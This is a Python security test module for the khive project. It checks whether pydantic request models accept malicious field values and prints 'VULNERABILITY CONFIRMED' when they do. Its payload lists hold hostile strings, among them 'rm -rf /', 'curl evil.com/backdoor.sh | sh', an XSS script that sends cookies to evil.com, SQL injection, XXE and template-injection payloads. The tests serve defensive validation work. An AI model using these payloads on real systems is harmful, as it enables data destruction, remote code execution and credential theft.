"""Security Tests for Model Validation Gaps

This module specifically tests the security vulnerabilities identified in the
security analysis, focusing on models that lack proper field validation:

1. AgentRequest model - lacks field validators on instruct field
2. ComposerRequest model - lacks field validation on role, domains, context fields
3. Inconsistent validation patterns across models

These tests verify that the identified vulnerabilities exist and demonstrate
the attack vectors that could exploit them.
"""

import json

from pydantic import ValidationError

from khive.services.composition.parts import ComposerRequest
from khive.services.orchestration.parts import AgentRequest


class TestAgentRequestValidationGaps:
    """Test security gaps in AgentRequest model validation."""

    def test_instruct_field_lacks_validation(self):
        """Test that AgentRequest.instruct field lacks proper validation."""
        # The security analysis identified that AgentRequest.instruct field
        # has no validation despite handling sensitive instruction data

        malicious_instruct_payloads = [
            # Command injection through instruction field
            {"task": "rm -rf /", "context": "Execute system cleanup"},
            # SQL injection through instruction
            {"task": "'; DROP TABLE users; --", "context": "Database query task"},
            # XSS through instruction
            {"task": "<script>alert('XSS')</script>", "context": "Web content task"},
            # Path traversal through instruction
            {"task": "Read file: ../../../etc/passwd", "context": "File analysis task"},
            # Code injection through instruction
            {
                "task": "eval('import os; os.system(\"rm -rf /\")')",
                "context": "Python evaluation task",
            },
            # Serialization attack through instruction
            {
                "task": "Process data",
                "context": {
                    "__proto__": {"admin": True},
                    "command": "malicious_payload",
                },
            },
        ]

        base_compose_request = {"role": "researcher", "context": "legitimate context"}

        for malicious_instruct in malicious_instruct_payloads:
            request_data = {
                "instruct": malicious_instruct,
                "compose_request": base_compose_request,
            }

            try:
                # This should pass validation due to missing validators
                result = AgentRequest.model_validate(request_data)

                # Verify the malicious content was not sanitized (proving the vulnerability)
                instruct_dict = (
                    result.instruct.model_dump()
                    if hasattr(result.instruct, "model_dump")
                    else result.instruct.__dict__
                )
                instruct_str = json.dumps(instruct_dict)

                # Check if dangerous patterns remain (indicating lack of validation)
                dangerous_patterns_present = []
                if "rm -rf" in instruct_str:
                    dangerous_patterns_present.append("command injection")
                if "DROP TABLE" in instruct_str:
                    dangerous_patterns_present.append("SQL injection")
                if "<script>" in instruct_str:
                    dangerous_patterns_present.append("XSS")
                if "../../../etc/passwd" in instruct_str:
                    dangerous_patterns_present.append("path traversal")
                if "eval(" in instruct_str:
                    dangerous_patterns_present.append("code injection")
                if "__proto__" in instruct_str:
                    dangerous_patterns_present.append("prototype pollution")

                # If dangerous patterns are present, this confirms the vulnerability
                if dangerous_patterns_present:
                    print(
                        f"VULNERABILITY CONFIRMED: AgentRequest.instruct field allows {', '.join(dangerous_patterns_present)}"
                    )

            except ValidationError:
                # If validation fails, the field has some protection (unexpected based on analysis)
                print(
                    f"Unexpected: AgentRequest validation rejected: {malicious_instruct}"
                )
            except Exception as e:
                # Other errors (e.g., Instruct model issues)
                print(f"Error creating AgentRequest with malicious instruct: {e}")

    def test_instruct_field_size_limits(self):
        """Test if instruct field has size/complexity limits."""
        # Test large instruction payloads
        large_payloads = [
            # Extremely long task
            {
                "task": "A" * 100000,  # 100KB task
                "context": "Normal context",
            },
            # Deeply nested context
            {
                "task": "Process nested data",
                "context": {"level1": {"level2": {"level3": {"data": "x" * 10000}}}},
            },
            # Large array in context
            {"task": "Process array data", "context": {"items": ["item"] * 10000}},
        ]

        base_compose_request = {"role": "researcher"}

        for large_payload in large_payloads:
            request_data = {
                "instruct": large_payload,
                "compose_request": base_compose_request,
            }

            try:
                result = AgentRequest.model_validate(request_data)
                print(
                    f"VULNERABILITY: AgentRequest accepts large payload: {len(json.dumps(large_payload))} bytes"
                )

                # Check if there are any implicit size limits
                instruct_size = len(
                    json.dumps(
                        result.instruct.model_dump()
                        if hasattr(result.instruct, "model_dump")
                        else result.instruct.__dict__
                    )
                )
                if instruct_size > 50000:  # 50KB
                    print(
                        f"WARNING: Very large instruct field accepted: {instruct_size} bytes"
                    )

            except (ValidationError, MemoryError, Exception) as e:
                print(f"Large payload rejected: {type(e).__name__}: {e}")

    def test_analysis_type_field_validation(self):
        """Test validation of analysis_type field."""
        # Test invalid analysis types
        invalid_analysis_types = [
            "InvalidType",
            "'; DROP TABLE analysis; --",  # SQL injection
            "<script>alert('XSS')</script>",  # XSS
            "../../../etc/passwd",  # Path traversal
            None,  # None should be allowed based on field definition
        ]

        base_data = {
            "instruct": {"task": "test task"},
            "compose_request": {"role": "researcher"},
        }

        for invalid_type in invalid_analysis_types:
            test_data = {**base_data, "analysis_type": invalid_type}

            try:
                result = AgentRequest.model_validate(test_data)
                if invalid_type is not None and invalid_type not in [
                    "RequirementsAnalysis",
                    "CodeContextAnalysis",
                    "IntegrationStrategy",
                    "FeatureImplementation",
                    "RequirementValidation",
                    "DocumentationPackage",
                    "TestStrategy",
                    "WorkSynthesis",
                ]:
                    print(
                        f"VULNERABILITY: Invalid analysis_type accepted: {invalid_type}"
                    )
            except ValidationError as e:
                print(f"Analysis type validation working for: {invalid_type}")


class TestComposerRequestValidationGaps:
    """Test security gaps in ComposerRequest model validation."""

    def test_role_field_lacks_validation(self):
        """Test that ComposerRequest.role field lacks proper validation."""
        # The security analysis identified that ComposerRequest has no field validators

        malicious_role_payloads = [
            # Path traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            # Command injection
            "researcher; rm -rf /tmp/*",
            "analyst && curl evil.com/backdoor.sh | sh",
            # SQL injection
            "admin'; DROP TABLE roles; --",
            "user' OR 1=1; --",
            # XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            # Null bytes
            "admin\x00hidden",
            # Unicode attacks
            "admіn",  # Cyrillic 'і'
            "rοle",  # Greek 'ο'
            # Control characters
            "role\r\n\t",
            "role\v\f\b",
            # Extremely long role
            "A" * 10000,
        ]

        for malicious_role in malicious_role_payloads:
            try:
                result = ComposerRequest.model_validate({"role": malicious_role})
                print(
                    f"VULNERABILITY CONFIRMED: ComposerRequest.role field accepts malicious input: {malicious_role!r}"
                )

                # Check if the malicious content was preserved
                if hasattr(result, "role") and result.role:
                    if len(result.role) > 200:
                        print(
                            f"  - Accepts extremely long role: {len(result.role)} characters"
                        )
                    if any(char in result.role for char in ["..", "/", "\\"]):
                        print("  - Accepts path traversal characters")
                    if any(char in result.role for char in ["<", ">", "script"]):
                        print("  - Accepts XSS characters")
                    if ";" in result.role or "&&" in result.role:
                        print("  - Accepts command injection separators")

            except ValidationError as e:
                print(
                    f"ComposerRequest role validation working for: {repr(malicious_role)[:50]}..."
                )

    def test_domains_field_lacks_validation(self):
        """Test that ComposerRequest.domains field lacks proper validation."""

        malicious_domains_payloads = [
            # Path traversal through domains
            "software-architecture,../../../etc/passwd,system-design",
            # Command injection through domains
            "web-development; rm -rf /tmp/*",
            "database && curl evil.com/shell.sh | sh",
            # SQL injection through domains
            "analytics'; DROP TABLE domains; --",
            # XSS through domains
            "frontend,<script>alert('XSS')</script>,backend",
            # Extremely long domains list
            ",".join(["domain" + str(i) for i in range(1000)]),
            # Unicode homograph attacks
            "softwаre-аrchitecture",  # Cyrillic 'а'
            # Null byte injection
            "valid-domain\x00,hidden-admin-domain",
            # Control character injection
            "domain1\r\n,domain2\t,domain3\v",
        ]

        base_data = {"role": "researcher"}

        for malicious_domains in malicious_domains_payloads:
            test_data = {**base_data, "domains": malicious_domains}

            try:
                result = ComposerRequest.model_validate(test_data)
                print(
                    f"VULNERABILITY CONFIRMED: ComposerRequest.domains field accepts malicious input: {repr(malicious_domains)[:100]}..."
                )

                # Check preserved malicious content
                if hasattr(result, "domains") and result.domains:
                    if len(result.domains) > 1000:
                        print(
                            f"  - Accepts extremely long domains: {len(result.domains)} characters"
                        )
                    if ".." in result.domains:
                        print("  - Accepts path traversal in domains")
                    if "<script>" in result.domains.lower():
                        print("  - Accepts XSS in domains")

            except ValidationError as e:
                print(
                    f"ComposerRequest domains validation working for: {repr(malicious_domains)[:50]}..."
                )

    def test_context_field_lacks_validation(self):
        """Test that ComposerRequest.context field lacks proper validation."""

        malicious_context_payloads = [
            # File inclusion
            "Please read configuration from: ../../../etc/passwd",
            # Command execution
            "Execute: rm -rf /tmp/* && echo 'System cleaned'",
            # SQL injection
            "Database query: '; DROP TABLE users; SELECT * FROM admin WHERE 1=1; --",
            # XSS payload
            "User input: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
            # Code injection
            "Python code: eval('import os; os.system(\"whoami\")')",
            # Serialization attack
            json.dumps({
                "__proto__": {"admin": True, "role": "superuser"},
                "constructor": {"prototype": {"isAdmin": True}},
            }),
            # Template injection
            "Template: {{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].exit() }}",
            # LDAP injection
            "User filter: admin)(|(password=*))",
            # XML/XXE injection
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
            # Large context (DoS)
            "A" * 100000,  # 100KB context
            # Binary data
            "\x00\x01\x02\x03\x04\x05" + "A" * 100,
            # Unicode attacks
            "Context with unicode: \u0041\u0300" * 1000,  # Combining characters
        ]

        base_data = {"role": "researcher"}

        for malicious_context in malicious_context_payloads:
            test_data = {**base_data, "context": malicious_context}

            try:
                result = ComposerRequest.model_validate(test_data)
                print(
                    f"VULNERABILITY CONFIRMED: ComposerRequest.context field accepts malicious input: {repr(malicious_context)[:100]}..."
                )

                # Check preserved malicious content
                if hasattr(result, "context") and result.context:
                    context_str = str(result.context)
                    if len(context_str) > 50000:
                        print(
                            f"  - Accepts extremely large context: {len(context_str)} characters"
                        )
                    if "rm -rf" in context_str:
                        print("  - Accepts command injection")
                    if "DROP TABLE" in context_str:
                        print("  - Accepts SQL injection")
                    if "<script>" in context_str:
                        print("  - Accepts XSS payload")
                    if "__proto__" in context_str:
                        print("  - Accepts prototype pollution")
                    if "../../../etc/passwd" in context_str:
                        print("  - Accepts path traversal")

            except ValidationError as e:
                print(
                    f"ComposerRequest context validation working for: {repr(malicious_context)[:50]}..."
                )

    def test_no_field_sanitization(self):
        """Test that ComposerRequest performs no field sanitization."""

        # Test various dangerous inputs that should be sanitized
        dangerous_inputs = {
            "role": "admin<script>alert('role_xss')</script>",
            "domains": "system-admin,'; DROP TABLE domains; --",
            "context": "Context with command: $(rm -rf /tmp/*)",
        }

        try:
            result = ComposerRequest.model_validate(dangerous_inputs)
            print(
                "CRITICAL VULNERABILITY: ComposerRequest accepts all dangerous inputs without sanitization:"
            )

            if hasattr(result, "role"):
                print(f"  - Role: {result.role!r}")
            if hasattr(result, "domains"):
                print(f"  - Domains: {result.domains!r}")
            if hasattr(result, "context"):
                print(f"  - Context: {repr(result.context)[:100]}...")

            # Verify dangerous content is preserved (proving lack of sanitization)
            result_dict = result.model_dump()
            result_str = json.dumps(result_dict)

            dangerous_preserved = []
            if "<script>" in result_str:
                dangerous_preserved.append("XSS")
            if "DROP TABLE" in result_str:
                dangerous_preserved.append("SQL injection")
            if "$(rm -rf" in result_str:
                dangerous_preserved.append("Command injection")

            if dangerous_preserved:
                print(
                    f"  - Dangerous patterns preserved: {', '.join(dangerous_preserved)}"
                )

        except ValidationError as e:
            print(f"Unexpected: ComposerRequest rejected dangerous inputs: {e}")


class TestValidationInconsistencies:
    """Test inconsistent validation patterns across models."""

    def test_agentcompositionrequest_vs_composerrequest_validation(self):
        """Compare validation between AgentCompositionRequest and ComposerRequest."""

        # Test same malicious input against both models
        test_inputs = [
            {"role": "admin'; DROP TABLE users; --"},
            {"role": "<script>alert('XSS')</script>"},
            {"role": "../../../etc/passwd"},
            {"role": "A" * 200},  # Long role
        ]

        print(
            "Comparing validation between AgentCompositionRequest and ComposerRequest:"
        )

        for test_input in test_inputs:
            print(f"\nTesting input: {repr(test_input['role'])[:50]}...")

            # Test AgentCompositionRequest (has some validation)
            try:
                from khive.services.composition.parts import \
                    AgentCompositionRequest

                result1 = AgentCompositionRequest.model_validate(test_input)
                print(
                    f"  AgentCompositionRequest: ACCEPTED - {repr(result1.role)[:50]}"
                )
            except ValidationError as e:
                print(f"  AgentCompositionRequest: REJECTED - {str(e)[:100]}")

            # Test ComposerRequest (no validation according to analysis)
            try:
                result2 = ComposerRequest.model_validate(test_input)
                print(f"  ComposerRequest: ACCEPTED - {repr(result2.role)[:50]}")
            except ValidationError as e:
                print(f"  ComposerRequest: REJECTED - {str(e)[:100]}")

    def test_validation_pattern_gaps(self):
        """Test for gaps in validation patterns across all models."""

        from khive.services.composition.parts import AgentCompositionRequest
        from khive.services.orchestration.parts import ComplexityAssessment

        # Common malicious payload
        malicious_string = (
            "'; DROP TABLE test; <script>alert('XSS')</script>; ../../../etc/passwd"
        )

        test_scenarios = [
            (AgentCompositionRequest, {"role": malicious_string}),
            (ComposerRequest, {"role": malicious_string}),
            (
                ComplexityAssessment,
                {"overall_complexity_score": 0.5, "explanation": malicious_string},
            ),
        ]

        print("Testing validation consistency across models:")

        for model_class, test_data in test_scenarios:
            try:
                result = model_class.model_validate(test_data)
                print(
                    f"  {model_class.__name__}: VULNERABILITY - Accepts malicious input"
                )

                # Check if dangerous content is preserved
                result_dict = result.model_dump()
                result_str = json.dumps(result_dict)
                if "DROP TABLE" in result_str and "<script>" in result_str:
                    print("    - Dangerous content fully preserved")
                elif "DROP TABLE" in result_str or "<script>" in result_str:
                    print("    - Some dangerous content preserved")
                else:
                    print("    - Dangerous content sanitized")

            except ValidationError as e:
                print(f"  {model_class.__name__}: PROTECTED - Rejects malicious input")


class TestMissingAuditLogging:
    """Test for missing audit logging of validation failures."""

    def test_validation_failure_logging(self):
        """Test if validation failures are logged for security monitoring."""

        # This test would check if there's audit logging for failed validation attempts
        # which is important for detecting systematic attack attempts

        malicious_attempts = [
            {"role": "'; DROP TABLE users; --"},
            {"role": "<script>alert('XSS')</script>"},
            {"role": "admin; rm -rf /"},
        ]

        print("Testing audit logging for validation failures:")

        # Note: Without access to the logging system, this test demonstrates
        # the need for audit logging but cannot verify its presence

        for attempt in malicious_attempts:
            try:
                ComposerRequest.model_validate(attempt)
                print(
                    f"  No validation failure to log for: {repr(attempt['role'])[:30]}"
                )
            except ValidationError as e:
                print(
                    f"  Validation failed for: {repr(attempt['role'])[:30]} - Should be logged for audit"
                )

        print(
            "\nRECOMMENDATION: Implement audit logging for validation failures to detect attack patterns"
        )


if __name__ == "__main__":
    # Run tests to demonstrate the security gaps
    print("=" * 80)
    print("SECURITY VULNERABILITY ASSESSMENT - Model Validation Gaps")
    print("=" * 80)

    # Run each test class
    test_classes = [
        TestAgentRequestValidationGaps,
        TestComposerRequestValidationGaps,
        TestValidationInconsistencies,
        TestMissingAuditLogging,
    ]

    for test_class in test_classes:
        print(f"\n{test_class.__name__}:")
        print("-" * 40)

        test_instance = test_class()
        for method_name in dir(test_instance):
            if method_name.startswith("test_"):
                print(f"\nRunning {method_name}:")
                try:
                    method = getattr(test_instance, method_name)
                    method()
                except Exception as e:
                    print(f"  Error in {method_name}: {e}")
